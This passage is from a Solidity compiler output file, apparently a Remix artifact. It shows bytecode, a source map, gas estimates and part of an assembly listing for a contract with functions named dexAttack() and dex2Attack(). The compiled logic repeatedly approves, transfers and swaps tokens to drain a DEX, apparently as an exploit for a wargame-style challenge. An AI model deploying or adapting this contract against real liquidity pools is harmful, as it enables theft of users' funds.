0xBB6 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xBD0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xBE4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xC44 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xC68 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC86 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xCA0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xCB4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xD14 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD38 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD56 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD70 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xD84 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xDE4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xE08 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE26 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE40 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE54 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEB4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xED8 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEF6 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF24 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0xDF791E5 PUSH1 0xE4 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP PUSH2 0x8FD SWAP4 SWAP3 DUP4 AND SWAP3 SWAP1 SWAP2 AND SWAP1 PUSH1 0x2D SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xF90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP3 AND PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x40 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x60 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0xF90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFEF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC0 ISZERO SLOAD POP MUL 0xB6 AND 0xC9 PUSH1 0x0 SUB BLOCKHASH CALLCODE GT 0xE4 0xB9 PUSH13 0x1EED86BE79A67AEF673E97BA5F 0x4B PUSH17 0x64736F6C63430008120033000000000000 ",
							"sourceMap": "254:2204:4:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;506:75;;;;;;:::i;:::-;558:6;:16;;-1:-1:-1;;;;;;558:16:4;-1:-1:-1;;;;;558:16:4;;;;;;;;;;506:75;;;1327:1127;;;:::i;587:732::-;;;:::i;1327:1127::-;1375:6;;1368:58;;-1:-1:-1;;;1368:58:4;;-1:-1:-1;;;;;1375:6:4;;;;1368:27;;:58;;1396:10;;1416:4;;1423:2;;1368:58;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;1443:6:4;;1436:58;;-1:-1:-1;;;1436:58:4;;-1:-1:-1;;;;;1443:6:4;;;;1436:27;;:58;;1464:10;;1484:4;;1491:2;;1436:58;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;1512:6:4;;1528:3;;1505:43;;-1:-1:-1;;;1505:43:4;;-1:-1:-1;;;;;1528:3:4;;;1505:43;;;1150:51:5;-1:-1:-1;;1217:18:5;;;1210:34;1512:6:4;;;1505:22;;1123:18:5;;1505:43:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;1565:6:4;;1581:3;;1558:43;;-1:-1:-1;;;1558:43:4;;-1:-1:-1;;;;;1581:3:4;;;1558:43;;;1150:51:5;-1:-1:-1;;1217:18:5;;;1210:34;1565:6:4;;;1558:22;;1123:18:5;;1558:43:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;1617:3:4;;;1627:6;1617:3;1635:6;1643:39;;-1:-1:-1;;;1643:39:4;;1676:4;1643:39;;;1401:51:5;-1:-1:-1;;;;;1617:3:4;;;;1612:14;;1627:6;;;1635;;1627;;1643:24;;1374:18:5;;1643:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1612:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1700:3:4;;;1710:6;1700:3;1718:6;1726:39;;-1:-1:-1;;;1726:39:4;;1759:4;1726:39;;;1401:51:5;-1:-1:-1;;;;;1700:3:4;;;;-1:-1:-1;1695:14:4;;-1:-1:-1;1710:6:4;;;;1718;;1710;;1726:24;;1374:18:5;;1726:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1695:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1781:3:4;;;1791:6;1781:3;1799:6;1807:39;;-1:-1:-1;;;1807:39:4;;1840:4;1807:39;;;1401:51:5;-1:-1:-1;;;;;1781:3:4;;;;-1:-1:-1;1776:14:4;;-1:-1:-1;1791:6:4;;;;1799;;1791;;1807:24;;1374:18:5;;1807:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1776:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1862:3:4;;;1872:6;1862:3;1880:6;1888:39;;-1:-1:-1;;;1888:39:4;;1921:4;1888:39;;;1401:51:5;-1:-1:-1;;;;;1862:3:4;;;;-1:-1:-1;1857:14:4;;-1:-1:-1;1872:6:4;;;;1880;;1872;;1888:24;;1374:18:5;;1888:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1857:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1943:3:4;;;1953:6;1943:3;1961:6;1969:39;;-1:-1:-1;;;1969:39:4;;2002:4;1969:39;;;1401:51:5;-1:-1:-1;;;;;1943:3:4;;;;-1:-1:-1;1938:14:4;;-1:-1:-1;1953:6:4;;;;1961;;1953;;1969:24;;1374:18:5;;1969:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1938:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;2024:3:4;;;2034:6;2024:3;2042:6;2019:34;;-1:-1:-1;;;2019:34:4;;-1:-1:-1;;;;;2024:3:4;;;;-1:-1:-1;2019:14:4;;-1:-1:-1;2019:34:4;;2034:6;;;;2042;;;;2050:2;;2019:34;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;2203:6:4;;2236:3;;2196:48;;-1:-1:-1;;;2196:48:4;;-1:-1:-1;;;;;2203:6:4;;;;-1:-1:-1;2196:27:4;;-1:-1:-1;2196:48:4;;2224:10;;2236:3;;2241:2;;2196:48;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;2261:6:4;;2254:58;;-1:-1:-1;;;2254:58:4;;-1:-1:-1;;;;;2261:6:4;;;;2254:27;;:58;;2282:10;;2302:4;;2309:2;;2254:58;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;2329:6:4;;2345:3;;2322:43;;-1:-1:-1;;;2322:43:4;;-1:-1:-1;;;;;2345:3:4;;;2322:43;;;1150:51:5;-1:-1:-1;;1217:18:5;;;1210:34;2329:6:4;;;2322:22;;1123:18:5;;2322:43:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;2381:3:4;;2391:6;;2381:3;2399:6;2407:39;;-1:-1:-1;;;2407:39:4;;2440:4;2407:39;;;1401:51:5;-1:-1:-1;;;;;2381:3:4;;;;2376:14;;2391:6;;;2399;;2391;;2407:24;;1374:18:5;;2407:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2376:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1327:1127::o;587:732::-;634:6;;627:58;;-1:-1:-1;;;627:58:4;;-1:-1:-1;;;;;634:6:4;;;;627:27;;:58;;655:10;;675:4;;682:2;;627:58;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;702:6:4;;695:58;;-1:-1:-1;;;695:58:4;;-1:-1:-1;;;;;702:6:4;;;;695:27;;:58;;723:10;;743:4;;750:2;;695:58;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;771:6:4;;787:3;;764:43;;-1:-1:-1;;;764:43:4;;-1:-1:-1;;;;;787:3:4;;;764:43;;;1150:51:5;-1:-1:-1;;1217:18:5;;;1210:34;771:6:4;;;764:22;;1123:18:5;;764:43:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;824:6:4;;840:3;;817:43;;-1:-1:-1;;;817:43:4;;-1:-1:-1;;;;;840:3:4;;;817:43;;;1150:51:5;-1:-1:-1;;1217:18:5;;;1210:34;824:6:4;;;817:22;;1123:18:5;;817:43:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;876:3:4;;;886:6;876:3;894:6;902:39;;-1:-1:-1;;;902:39:4;;935:4;902:39;;;1401:51:5;-1:-1:-1;;;;;876:3:4;;;;871:14;;886:6;;;894;;886;;902:24;;1374:18:5;;902:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;871:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;959:3:4;;;969:6;959:3;977:6;985:39;;-1:-1:-1;;;985:39:4;;1018:4;985:39;;;1401:51:5;-1:-1:-1;;;;;959:3:4;;;;-1:-1:-1;954:14:4;;-1:-1:-1;969:6:4;;;;977;;969;;985:24;;1374:18:5;;985:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;954:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1040:3:4;;;1050:6;1040:3;1058:6;1066:39;;-1:-1:-1;;;1066:39:4;;1099:4;1066:39;;;1401:51:5;-1:-1:-1;;;;;1040:3:4;;;;-1:-1:-1;1035:14:4;;-1:-1:-1;1050:6:4;;;;1058;;1050;;1066:24;;1374:18:5;;1066:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1035:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1121:3:4;;;1131:6;1121:3;1139:6;1147:39;;-1:-1:-1;;;1147:39:4;;1180:4;1147:39;;;1401:51:5;-1:-1:-1;;;;;1121:3:4;;;;-1:-1:-1;1116:14:4;;-1:-1:-1;1131:6:4;;;;1139;;1131;;1147:24;;1374:18:5;;1147:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1116:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1202:3:4;;;1212:6;1202:3;1220:6;1228:39;;-1:-1:-1;;;1228:39:4;;1261:4;1228:39;;;1401:51:5;-1:-1:-1;;;;;1202:3:4;;;;-1:-1:-1;1197:14:4;;-1:-1:-1;1212:6:4;;;;1220;;1212;;1228:24;;1374:18:5;;1228:39:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1197:71;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1283:3:4;;;1293:6;1283:3;1301:6;1278:34;;-1:-1:-1;;;1278:34:4;;-1:-1:-1;;;;;1283:3:4;;;;-1:-1:-1;1278:14:4;;-1:-1:-1;1278:34:4;;1293:6;;;;1301;;;;1309:2;;1278:34;;;:::i;14:286:5:-;73:6;126:2;114:9;105:7;101:23;97:32;94:52;;;142:1;139;132:12;94:52;168:23;;-1:-1:-1;;;;;220:31:5;;210:42;;200:70;;266:1;263;256:12;200:70;289:5;14:286;-1:-1:-1;;;14:286:5:o;305:384::-;-1:-1:-1;;;;;572:15:5;;;554:34;;624:15;;;;619:2;604:18;;597:43;671:2;656:18;;649:34;;;;504:2;489:18;;305:384::o;694:277::-;761:6;814:2;802:9;793:7;789:23;785:32;782:52;;;830:1;827;820:12;782:52;862:9;856:16;915:5;908:13;901:21;894:5;891:32;881:60;;937:1;934;927:12;1463:184;1533:6;1586:2;1574:9;1565:7;1561:23;1557:32;1554:52;;;1602:1;1599;1592:12;1554:52;-1:-1:-1;1625:16:5;;1463:184;-1:-1:-1;1463:184:5:o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "828000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"dex2Attack()": "infinite",
								"dexAttack()": "infinite",
								"setToken3(address)": "24502"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 254,
									"end": 2458,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 254,
									"end": 2458,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "ISZERO",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSH [tag]",
									"source": 4,
									"value": "1"
								},
								{
									"begin": 357,
									"end": 500,
									"name": "JUMPI",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 357,
									"end": 500,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "REVERT",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "tag",
									"source": 4,
									"value": "1"
								},
								{
									"begin": 357,
									"end": 500,
									"name": "JUMPDEST",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 357,
									"end": 500,
									"name": "MLOAD",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSHSIZE",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "CODESIZE",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "SUB",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSHSIZE",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "DUP4",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "ADD",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 357,
									"end": 500,
									"name": "DUP2",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSH [tag]",
									"source": 4,
									"value": "2"
								},
								{
									"begin": 357,
									"end": 500,
									"name": "SWAP2",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "PUSH [tag]",
									"source": 4,
									"value": "3"
								},
								{
									"begin": 357,
									"end": 500,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 4
								},
								{
									"begin": 357,
									"end": 500,
									"name": "tag",
									"source": 4,
									"value": "2"
								},
								{
									"begin": 357,
									"end": 500,
									"name": "JUMPDEST",
									"source": 4
								},
								{
									"begin": 431,
									"end": 437,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 431,
									"end": 447,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "SLOAD",
									"source": 4
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 431,
									"end": 447,
									"name": "SWAP5",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "DUP6",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "AND",
									"source": 4
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 431,
									"end": 447,
									"name": "SWAP2",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "DUP3",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "OR",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "SWAP2",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "SSTORE",
									"source": 4
								},
								{
									"begin": 431,
									"end": 447,
									"name": "PUSH",
									"source": 4,
									"value": "1"
								},
								{
									"begin": 457,
									"end": 473,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SLOAD",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SWAP4",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "DUP6",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SWAP4",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "DUP3",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SWAP4",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SWAP4",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "OR",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SWAP3",
									"source": 4
								},
								{
									"begin": 457,
									"end": 473,
									"name": "SSTORE",
									"source": 4
								},
								{
									"begin": 483,
									"end": 486,
									"name": "PUSH",
									"source": 4,
									"value": "3"
								},
								{
									"begin": 483,
									"end": 493,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "SLOAD",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "SWAP2",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "SWAP1",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "SWAP4",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "SWAP2",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "AND",
									"source": 4
								},
								{
									"begin": 483,
									"end": 493,
									"name": "OR",
									"source": 4
								},
